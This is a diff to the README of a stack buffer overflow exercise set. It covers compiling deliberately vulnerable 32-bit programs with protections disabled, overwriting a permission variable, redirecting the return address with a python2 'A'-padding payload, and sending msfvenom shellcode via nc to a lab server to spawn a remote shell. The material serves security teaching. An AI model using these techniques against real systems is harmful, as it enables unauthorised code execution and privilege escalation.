@@ -20,14 +20,14 @@ This test exercise is used to explain how memory works and how data is managed i
 
 ## Compilation
 ```bash
-    cd /path/to/repo/src
-    gcc -O0 -m32 -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -g exercise_test.c -o exercise_test
+    cd /path/to/repo/src/ex0
+    gcc -O0 -m32 -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -g exercise0.c -o exercise0
 ```
 
 ## Execution
 ```bash
-    cd /path/to/repo/src
-    gdb exercise_test
+    cd /path/to/repo/src/ex0
+    gdb exercise0
 ```
 # First Exercise
 
@@ -35,42 +35,42 @@ The first exercise consists in overwrite a variable used to grant permission to 
 
 ## Compilation
 ```bash
-    cd /path/to/repo/src
+    cd /path/to/repo/src/ex1
     gcc -O0 -m32 -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -g exercise1.c -o exercise1
 ```
 
 ## Execution
 ```bash
-    cd /path/to/repo/src
-    ./exercise input
+    cd /path/to/repo/src/ex1
+    ./exercise1 input
 ```
 # Second Exercise
 
-The second exercise consists in overwrite the `%eip` register of the stack in order to redirect the program to a chosen function using the `strcpy()` vulnerable function and the `gdb` debugger in order to find out the right number of junk chars to fill up the stack
+The second exercise consists in overwrite the `RET` address of the stack in order to redirect the program to a chosen function using the `strcpy()` vulnerable function and the `gdb` debugger in order to find out the right number of junk chars to fill up the stack
 
 ## Compilation
 ```bash
-    cd /path/to/repo/src
+    cd /path/to/repo/src/ex2
     gcc -O0 -m32 -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -g exercise2.c -o exercise2
 ```
 
 ## Find out the function register
 ```bash
-    cd /path/to/repo/src
+    cd /path/to/repo/src/ex2
     objdump -d exercise2 | grep <function_name>
 ```
 ## Execution
 ```bash
-    cd /path/to/repo/src
-    ./exercise $(python2 -c 'print"A"*<num_char> + "function register"')
+    cd /path/to/repo/src/ex2
+    ./exercise2 $(python2 -c 'print"A"*<num_char> + "function register"')
 ```
     keep in mind that the intel cpu are Little Endian so pay attention when insert the register
 # Third Exercise
-The third exercise consists in overwrite the `%eip` register of the stack and fill up the buffer with a shellcode in order to spawn a remote shell possibly with root privileges
+The third exercise consists in overwrite the `RET` address of the stack and fill up the buffer with a shellcode in order to spawn a remote shell possibly with root privileges
 ## Compilation server
 ```bash
-    cd /path/to/repo/src
-    gcc -O0 -m32 -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -g p4-server.c -o p4-server
+    cd /path/to/repo/src/ex3
+    gcc -O0 -m32 -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -g exercise3_server.c -o exercise3_server
 ```
 
 ## Create a shellcode using msfvenom
@@ -79,13 +79,14 @@ The third exercise consists in overwrite the `%eip` register of the stack and fi
 ```
 ## Execution server
 ```bash
-    cd /path/to/repo/src
-    ./p4-server
+    cd /path/to/repo/src/ex3
+    ./exercise3_server
 ```
 
 ## Execution Client
 ```bash
-    ./generate_malicious_string > string
+    use one of the ex3-client file to generate a malicious string
+    ./ex3-client*.py > string
     nc <server_port> 4001 < string 
     to generate the malicious string use the buffer output of the previous command and the %eip register found using the debugger
 
